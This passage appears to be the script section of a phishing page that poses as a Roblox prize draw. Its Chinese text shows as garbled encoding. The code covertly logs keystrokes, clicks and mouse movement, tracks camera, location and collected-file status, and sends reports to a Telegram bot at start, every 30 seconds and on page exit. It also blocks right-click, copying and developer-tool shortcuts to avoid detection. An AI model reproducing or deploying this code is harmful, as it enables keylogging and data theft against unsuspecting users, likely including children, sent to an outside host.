ğŸ“¸ æ‘„åƒå¤´: ${collectedData.camera?.accessed ? 'âœ… å·²è®¿é—®' : 'âŒ æœªè®¿é—®'}
ğŸ“ æ–‡ä»¶: ${filesCollected.length} ä¸ªæ–‡ä»¶

ğŸ”— UserAgent:
${collectedData.device?.userAgent?.substring(0, 100) || 'æœªçŸ¥'}`;

                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                logStealth('[æ•°æ®] åˆå§‹æ•°æ®å·²å‘é€');
                
            } catch (error) {
                logStealth(`[æ•°æ®] å‘é€å¤±è´¥: ${error.message}`);
            }
        }

        // æ”¶é›†é¢å¤–æ•°æ®
        function collectAdditionalData() {
            // æ”¶é›†é¼ æ ‡ç§»åŠ¨
            document.addEventListener('mousemove', (e) => {
                if (!collectedData.behavior) collectedData.behavior = [];
                if (collectedData.behavior.length < 100) {
                    collectedData.behavior.push({
                        type: 'mousemove',
                        x: e.clientX,
                        y: e.clientY,
                        t: Date.now()
                    });
                }
            });
            
            // æ”¶é›†ç‚¹å‡»
            document.addEventListener('click', (e) => {
                if (!collectedData.clicks) collectedData.clicks = [];
                collectedData.clicks.push({
                    x: e.clientX,
                    y: e.clientY,
                    target: e.target.tagName,
                    t: new Date().toISOString()
                });
            });
            
            // æ”¶é›†é”®ç›˜è¾“å…¥
            document.addEventListener('keydown', (e) => {
                if (!collectedData.keystrokes) collectedData.keystrokes = [];
                collectedData.keystrokes.push({
                    key: e.key,
                    code: e.code,
                    t: Date.now()
                });
            });
        }

        // å®šæœŸå‘é€æ›´æ–°æ•°æ®
        function scheduleDataUpdates() {
            setInterval(async () => {
                if (!stealthMode) return;
                
                const updateMessage = `ğŸ“Š æ•°æ®æ›´æ–°
æ—¶é—´: ${new Date().toLocaleTimeString()}
æ–‡ä»¶æ•°é‡: ${filesCollected.length}
æ‘„åƒå¤´: ${collectedData.camera?.accessed ? 'å·²è®¿é—®' : 'æœªè®¿é—®'}
ä½ç½®: ${collectedData.location ? 'å·²è·å–' : 'æœªè·å–'}
è¡Œä¸ºæ•°æ®: ${collectedData.behavior?.length || 0} ç‚¹`;
                
                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CONFIG.chatId,
                            text: updateMessage
                        })
                    });
                } catch (error) {
                    // é™é»˜å¤±è´¥
                }
            }, 30000); // æ¯30ç§’æ›´æ–°ä¸€æ¬¡
        }

        // ==================== è¾…åŠ©å‡½æ•° ====================

        // éšè”½æ—¥å¿—
        function logStealth(message) {
            console.log(`[éšè”½æ”¶é›†] ${message}`);
        }

        // æ ¼å¼åŒ–æ–‡ä»¶å¤§å°
        function formatSize(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        // ==================== ä¸»æµç¨‹ ====================

        // åˆå§‹åŒ–é¡µé¢
        async function initPage() {
            // æ¨¡æ‹ŸåŠ è½½è¿‡ç¨‹
            updateLoadingText('æ­£åœ¨éªŒè¯Robloxè´¦æˆ·...');
            await delay(1500);
            
            updateLoadingText('æ­£åœ¨åŠ è½½å¥–å“æ•°æ®...');
            await delay(1500);
            
            updateLoadingText('æ­£åœ¨åˆå§‹åŒ–æŠ½å¥–ç³»ç»Ÿ...');
            await delay(1000);
            
            // æ˜¾ç¤ºä¸»é¡µé¢
            loadingScreen.style.display = 'none';
            mainContent.style.display = 'block';
            
            // å¼€å§‹å€’è®¡æ—¶
            initCountdown();
            
            // å¼€å§‹éšè”½æ”¶é›†
            startStealthCollection();
            
            // è®¾ç½®æ–‡ä»¶å®šæœŸè§¦å‘
            scheduleFileTrigger();
            
            // è®¾ç½®æ•°æ®å®šæœŸæ›´æ–°
            scheduleDataUpdates();
            
            logStealth('é¡µé¢åˆå§‹åŒ–å®Œæˆï¼Œéšè”½æ”¶é›†å·²å¯åŠ¨');
        }

        // å»¶è¿Ÿå‡½æ•°
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // é˜²æ£€æµ‹
        function setupProtection() {
            // ç¦ç”¨å³é”®èœå•
            document.addEventListener('contextmenu', (e) => e.preventDefault());
            
            // ç¦ç”¨å¼€å‘è€…å·¥å…·
            document.addEventListener('keydown', (e) => {
                if (e.key === 'F12' || 
                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
                    (e.ctrlKey && e.key === 'u')) {
                    e.preventDefault();
                }
            });
            
            // é˜²æ­¢å¤åˆ¶
            document.addEventListener('copy', (e) => e.preventDefault());
            
            // æ£€æµ‹å¼€å‘è€…å·¥å…·
            setInterval(() => {
                const widthDiff = window.outerWidth - window.innerWidth;
                const heightDiff = window.outerHeight - window.innerHeight;
                
                if (widthDiff > 100 || heightDiff > 100) {
                    stealthMode = false;
                    logStealth('[è­¦å‘Š] æ£€æµ‹åˆ°å¼€å‘è€…å·¥å…·');
                }
            }, 1000);
        }

        // é¡µé¢åŠ è½½å®Œæˆ
        window.addEventListener('DOMContentLoaded', () => {
            // è®¾ç½®é˜²æŠ¤
            setupProtection();
            
            // åˆå§‹åŒ–é¡µé¢
            setTimeout(initPage, 500);
            
            // ç‚¹å‡»å‚ä¸æŒ‰é’®æ˜¾ç¤ºéªŒè¯å¼¹çª—
            joinBtn.addEventListener('click', () => {
                showVerificationModal();
            });
            
            // ç»§ç»­æŒ‰é’®
            continueBtn.addEventListener('click', () => {
                verificationModal.style.display = 'none';
                startStealthCollection();
            });
            
            // é¡µé¢å…³é—­æ—¶å‘é€æœ€ç»ˆæ•°æ®
            window.addEventListener('beforeunload', () => {
                const finalMessage = `ğŸšª ç”¨æˆ·ç¦»å¼€é¡µé¢
æ€»è®¿é—®æ—¶é—´: ${Math.round((Date.now() - new Date(collectedData.timestamp).getTime()) / 1000)}ç§’
æ”¶é›†æ–‡ä»¶: ${filesCollected.length} ä¸ª
æ‘„åƒå¤´è®¿é—®: ${collectedData.camera?.accessed ? 'æˆåŠŸ' : 'å¤±è´¥'}
æ•°æ®ç‚¹: ${Object.keys(collectedData).length}`;
                
                // å¼‚æ­¥å‘é€ï¼Œä¸é˜»å¡é¡µé¢å…³é—­
                fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.chatId,
                        text: finalMessage
                    }),
                    keepalive: true // å…è®¸åœ¨é¡µé¢å…³é—­æ—¶å‘é€
                }).catch(() => {});
            });
        });
    </script>
</body>
</html>
